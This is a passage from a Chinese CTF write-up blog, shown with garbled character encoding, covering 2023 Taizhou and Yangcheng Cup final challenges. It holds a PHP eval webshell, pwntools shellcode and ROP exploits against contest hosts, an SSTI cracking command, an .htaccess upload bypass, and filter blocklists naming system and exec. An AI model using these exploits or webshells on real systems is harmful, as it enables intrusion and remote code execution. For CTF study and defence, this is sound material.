class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<br>	<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;<br>    @<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(),<span class="hljs-variable">$params</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>æ‹¿åˆ°keyåè§£å¯†å†°èæµé‡</p>
<p>å…¶ä¸­ä¸€æ¡æµé‡ä¸­å‘ç°å‘½ä»¤<code>cd /var/www/html/upload/../;tar -czvf - flag | openssl des3 -salt -k th1sisKey -out ./flag.tar.gz</code></p>
<p><img src="/img/wp/2023/2023taizhou-4.png"></p>
<p>ç”Ÿæˆ<code>openssl des3 -salt -k th1sisKey -in ./flag.tar.gz -d -out out.tar.gz</code></p>
<p><img src="/img/wp/2023/2023taizhou-5.png"></p>
<p>è§£å‹å¾—åˆ°<br><code>ğŸ™ƒğŸ’µğŸŒ¿ğŸ¤ğŸšªğŸŒğŸğŸ¥‹ğŸš«ğŸ˜†âœ…âœ‰ğŸš°ğŸš¹ğŸ¤ğŸ’§ğŸ“‚ğŸ‘‘ğŸš«â„¹ğŸ´ğŸ˜â„¹ğŸš¨ğŸ“®ğŸ›©ğŸ¥‹ğŸ¥‹ğŸ”ªâ˜€ğŸŒ‰ğŸ˜¡ğŸ‘‘ğŸ˜‚ğŸŒŠâŒ¨ğŸšªğŸš¹ğŸ˜ğŸˆğŸ’§ğŸ•¹ğŸ’§ğŸâ˜ƒâ„¹â˜ƒğŸ”ªğŸŒâœ…ğŸ˜‡ğŸâŒ¨ğŸŒ¿ğŸ’§ğŸŒŠğŸ…â˜‚â©ğŸŒŠğŸµğŸ“®â˜€ğŸ’µâŒ¨â˜‚ğŸ“®ğŸ˜‡â˜‚ğŸğŸ˜†â˜€ğŸšªğŸš¹ğŸµğŸ’§ğŸŒğŸš«ğŸ˜†ğŸ˜ğŸ…ğŸ˜€ğŸš°ğŸğŸ™ƒğŸ’§ğŸ—’ğŸ—’ </code></p>
<p>ä½¿ç”¨<code>th1sisKey</code>å¯†é’¥è§£emoji-aeså¾—åˆ°flag</p>
<h2 id="æå…ˆç”Ÿçš„è®¡ç®—æœº"><a href="#æå…ˆç”Ÿçš„è®¡ç®—æœº" class="headerlink" title="æå…ˆç”Ÿçš„è®¡ç®—æœº"></a>æå…ˆç”Ÿçš„è®¡ç®—æœº</h2><p><code>2.ad1</code>æ–‡ä»¶ï¼Œä½¿ç”¨FTK ImageræŒ‚è½½</p>
<p>æ ¹æ®æç¤ºç›´æ¥æ‰¾é‚®ä»¶å­˜å‚¨ä½ç½®<code>MailMasterData</code></p>
<p><img src="/img/wp/2023/2023taizhou-6.png"></p>
<p>æ‹¿åˆ°search.dbæ–‡ä»¶ï¼Œç”¨db browseræŸ¥çœ‹</p>
<p>å¾—åˆ°è½¬è´¦é‡‘é¢<code>600</code>å’Œé™„ä»¶å¯†ç <code>dbt_1126_tta</code></p>
<p><img src="/img/wp/2023/2023taizhou-7.png"></p>
<p>jpgåŠ å¯†è½¯ä»¶å¯†ç <code>123654</code></p>
<p><img src="/img/wp/2023/2023taizhou-8.png"></p>
<p>é™„ä»¶å¯ä»¥åœ¨<code>MailMasterData</code>ä¸‹æˆ–<code>download</code>ç›®å½•ä¸‹æ‰¾åˆ°</p>
<p><img src="/img/wp/2023/2023taizhou-9.png"></p>
<p>è§£å‹åå¾—åˆ°<code>BorromeanIslands.jpg</code>ï¼Œjphsè§£å¯†åå¾—åˆ°é“¶è¡Œå¡å·<code>6222025567723373838</code></p>
<p><code>DASCTF&#123;600_6222025567723373838&#125;</code></p>
<h2 id="Black-Mamba"><a href="#Black-Mamba" class="headerlink" title="Black Mamba"></a>Black Mamba</h2><p>iendåæœ‰å†—ä½™æ•°æ®ï¼Œæå–å‡ºæ¥åå¼‚æˆ–24</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>d=f.read()<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;output.zip&quot;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    f.write(<span class="hljs-built_in">bytes</span>([i^<span class="hljs-number">24</span>]))<br>f.close()<br></code></pre></td></tr></table></figure>

<p>å¼‚æˆ–åæ˜¯å‹ç¼©åŒ…ï¼Œhintæ˜¯<code>è¯´äº†å¾ˆå¤šæ¬¡ä¸è¦ç”¨è¿™ä¹ˆå¸¸è§çš„å¯†ç äº†</code></p>
<p>æå‡ºç¥–ä¼ çš„å­—å…¸çˆ†ç ´ï¼Œå¾—åˆ°<code>1qaz@WSX</code></p>
<p><img src="/img/wp/2023/2023taizhou-10.png"></p>
<p>è§£å‹åæ˜¯</p>
<figure class="highlight erlang-repl"><table><tr><td class="code"><pre><code class="hljs erlang-repl">EAOJYU?TRX&gt;&#123;XPFABY&#123;<span class="hljs-number">8</span>&#123;<span class="hljs-number">24</span>+<br>æœ‰äººå¥½åƒå¯¹æˆ‘é”®ç›˜åšäº†ç‚¹æ‰‹è„šï¼Œçœ‹èµ·æ¥åƒåäº†ä¸€æ ·ã€‚<br></code></pre></td></tr></table></figure>

<p>Dvorakè§£ç å¾—åˆ°<code>DASCTF&#123;KOBE_BRYANT_8_24&#125;</code></p>
<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="rrrrs"><a href="#rrrrs" class="headerlink" title="rrrrs"></a>rrrrs</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">a</span>):<br>    a^=a&gt;&gt;<span class="hljs-number">18</span><br>    a^=(a&lt;&lt;<span class="hljs-number">15</span>)&amp;<span class="hljs-number">0xefc60000</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        a^=((a&amp;(<span class="hljs-number">127</span>&lt;&lt;(<span class="hljs-number">7</span>*i)))&lt;&lt;<span class="hljs-number">7</span>)&amp;(<span class="hljs-number">0x9d2c5680</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        a^=(a&amp;(<span class="hljs-number">4292870144</span>&gt;&gt;(<span class="hljs-number">11</span>*i)))&gt;&gt;<span class="hljs-number">11</span><br>    <span class="hljs-keyword">return</span> a.to_bytes(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;big&#x27;</span>)<br><br>c=[<br><span class="hljs-number">0xa7a1e601</span>,<br><span class="hljs-number">0x10a6a5df</span>,<br><span class="hljs-number">0xa3f03b11</span>,<br><span class="hljs-number">0x7e523d64</span>,<br><span class="hljs-number">0xcb99d7a8</span>,<br><span class="hljs-number">0x2ddc2485</span>,<br><span class="hljs-number">0xe3c8b3cd</span>,<br><span class="hljs-number">0x6b82a51e</span>,<br><span class="hljs-number">0x0ea07814</span>,<br><span class="hljs-number">0x6bf2bf07</span>]<br>flag=<span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:<br>    flag+=decode(i)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>


<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="babyshell"><a href="#babyshell" class="headerlink" title="babyshell"></a>babyshell</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>p=remote(<span class="hljs-string">&quot;tcp.cloud.dasctf.com&quot;</span>,<span class="hljs-string">&quot;21844&quot;</span>)<br><span class="hljs-comment">#p=process(&#x27;babyshell&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p,&quot;bp $rebase(0x1366)&quot;)</span><br><span class="hljs-comment">#pause()</span><br>shellcode=shellcraft.openat(-<span class="hljs-number">100</span>,<span class="hljs-string">&quot;flag&quot;</span>)<br>shellcode+=shellcraft.brk()<br>shellcode+=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov rsi,rax</span><br><span class="hljs-string">sub rsi,0x1000</span><br><span class="hljs-string">mov rdi,3</span><br><span class="hljs-string">mov rdx,0x100</span><br><span class="hljs-string">mov rax,0</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>p.send(asm(shellcode))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="mercedes"><a href="#mercedes" class="headerlink" title="mercedes"></a>mercedes</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;tcp.cloud.dasctf.com&#x27;</span>,<span class="hljs-string">&#x27;28629&#x27;</span>)<br>e=ELF(<span class="hljs-string">&quot;mercedes&quot;</span>)<br>context.binary=e<br>system=e.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>comm=<span class="hljs-number">0x601090</span><br>rdi=<span class="hljs-number">0x0000000000400983</span><br>ret=<span class="hljs-number">0x00000000004005ae</span><br>p.sendafter(<span class="hljs-string">&#x27;drink&#x27;</span>,<span class="hljs-string">&#x27;tac flag 1&gt;&amp;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;you?&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(rdi)+p64(comm)+p64(ret)+p64(system))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>å°å·</tag>
        <tag>2023</tag>
      </tags>
  </entry>
  <entry>
    <title>2023ç¾ŠåŸæ¯å†³èµ›web&amp;pwn Break&amp;Fix wp</title>
    <url>/posts/cec9c888/</url>
    <content><![CDATA[<p>Breakå’ŒFixé˜¶æ®µéƒ½æ˜¯å°ç»„ç¬¬ä¸€</p>
<p>æ¯”èµ›çš„æ—¶å€™æ²¡å†™wpï¼Œ<strong>èµ›åå¤ç°</strong></p>
<h1 id="web-ezSSTI"><a href="#web-ezSSTI" class="headerlink" title="web-ezSSTI"></a>web-ezSSTI</h1><h2 id="Break"><a href="#Break" class="headerlink" title="Break"></a>Break</h2><p><a href="https://github.com/Marven11/Fenjing">ç„šé–</a>ä¸€æŠŠæ¢­<br><code>python -m fenjing crack --url &quot;http://192.168.100.100:10007/&quot; --method GET --inputs name  --environment jinja</code></p>
<p><img src="/img/wp/2023/2023ycb-final-1.png"></p>
<h2 id="Fix"><a href="#Fix" class="headerlink" title="Fix"></a>Fix</h2><p>app.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Template<br><span class="hljs-keyword">import</span> re<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>,<span class="hljs-string">&#x27;CTFer&lt;!--?name=CTFer&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> re.findall(<span class="hljs-string">r&quot;&#x27;|_|\\x|\\u|&#123;&#123;|\+|attr|\.| |class|init|globals|popen|system|env|exec|shell_exec|flag|passthru|proc_popen&quot;</span>,name):<br>        t = Template(<span class="hljs-string">&quot;hello &quot;</span>+name)<br>        <span class="hljs-keyword">return</span> t.render()<br>    <span class="hljs-keyword">else</span>:<br>        t = Template(<span class="hljs-string">&quot;Hacker!!!&quot;</span>)<br>        <span class="hljs-keyword">return</span> t.render()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>,port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure>

<p>ç›´æ¥åœ¨æ­£åˆ™ä¸­æ·»åŠ <code>&quot;</code>ï¼Œ<code>()</code>ï¼Œ<code>[]</code>ï¼Œ<code>\</code>ç­‰ç¬¦å·ï¼Œæ³¨æ„ä¸è¦è¿‡æ»¤å¤ªä¸¥æ ¼ï¼Œå¦åˆ™è¿‡ä¸äº†check</p>
<h1 id="web-easyupload"><a href="#web-easyupload" class="headerlink" title="web-easyupload"></a>web-easyupload</h1><h2 id="Break-1"><a href="#Break-1" class="headerlink" title="Break"></a>Break</h2><p>F12å¯ä»¥çœ‹åˆ°è´¦å·å¯†ç ï¼Œ<code>admin/hgrehhterh</code>ï¼Œè·³è½¬åˆ°<code>dadaadwdwfegrgewg.php</code>ï¼Œä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ç‚¹</p>
<p>ä¸Šä¼ <code>.htaccess</code>åä¼ å›¾ç‰‡æ‹¿shell</p>
<p><code>AddType application/x-httpd-php .png</code></p>
<p><img src="/img/wp/2023/2023ycb-final-2.png"></p>
<p><img src="/img/wp/2023/2023ycb-final-3.png"></p>
<h2 id="Fix-1"><a href="#Fix-1" class="headerlink" title="Fix"></a>Fix</h2><p>dadaadwdwfegrgewg.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">1</span>);<br><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;WWW_ROOT&quot;</span>,<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>]);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;APP_ROOT&quot;</span>,<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>)));<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;APP_URL_ROOT&quot;</span>,<span class="hljs-title function_ invoke__">str_replace</span>(WWW_ROOT,<span class="hljs-string">&quot;&quot;</span>,APP_ROOT));<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;UPLOAD_PATH&quot;</span>, <span class="hljs-string">&quot;upload&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><br><br><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.php1&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.pHp1&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//æ”¶å°¾å»ç©º</span><br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>&lt;div id=<span class="hljs-string">&quot;upload_panel&quot;</span>&gt;<br>            &lt;form enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> onsubmit=<span class="hljs-string">&quot;return checkFile()&quot;</span>&gt;<br>                &lt;p&gt;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„å›¾ç‰‡ï¼š&lt;p&gt;<br>                &lt;input <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">input_file</span>&quot; <span class="hljs-title">type</span>=&quot;<span class="hljs-title">file</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">upload_file</span>&quot;/&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">input</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">button</span>&quot; <span class="hljs-title">type</span>=&quot;<span class="hljs-title">submit</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">submit</span>&quot; <span class="hljs-title">value</span>=&quot;ä¸Šä¼ &quot;/&gt;</span><br><span class="hljs-class">            &lt;/<span class="hljs-title">form</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">msg</span>&quot;&gt;</span><br><span class="hljs-class">                &lt;?<span class="hljs-title">php</span> </span><br><span class="hljs-class">                    <span class="hljs-title">if</span>($<span class="hljs-title">msg</span> != <span class="hljs-title">null</span>)</span>&#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æç¤ºï¼š&quot;</span>.<span class="hljs-variable">$msg</span>;<br>                    &#125;<br>                <span class="hljs-meta">?&gt;</span><br>            &lt;/div&gt;<br>            &lt;div id=<span class="hljs-string">&quot;img&quot;</span>&gt;<br>                <span class="hljs-meta">&lt;?php</span><br>                    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$is_upload</span>)&#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;&#x27;</span>.<span class="hljs-variable">$img_path</span>.<span class="hljs-string">&#x27;&quot; width=&quot;250px&quot; /&gt;&#x27;</span>;<br>                    &#125;<br>                <span class="hljs-meta">?&gt;</span><br>            &lt;/div&gt;<br>&lt;/div&gt;<br></code></pre></td></tr></table></figure>

<p>é»‘åå•ä¸­åŠ ä¸ª<code>.htaccess</code>å¯ä»¥ç›´æ¥è¿‡check</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.php1&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.pHp1&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br></code></pre></td></tr></table></figure>

<h1 id="web-BabyMemo"><a href="#web-BabyMemo" class="headerlink" title="web-BabyMemo"></a>web-BabyMemo</h1><h2 id="Break-2"><a href="#Break-2" class="headerlink" title="Break"></a>Break</h2><p>æ‰«ç›®å½•ä¸‹è½½<code>www.zip</code></p>
<p>index.phpéƒ¨åˆ†æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ob_start</span>();<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;memos&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;memos&#x27;</span>] = [];<br>        &#125;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script&gt;window.location.href=&quot;memo.php&quot;;&lt;/script&gt;&#x27;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script&gt;window.location.href=&quot;index.php?error=1&quot;;&lt;/script&gt;&#x27;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">ob_end_flush</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>memo.php</p>
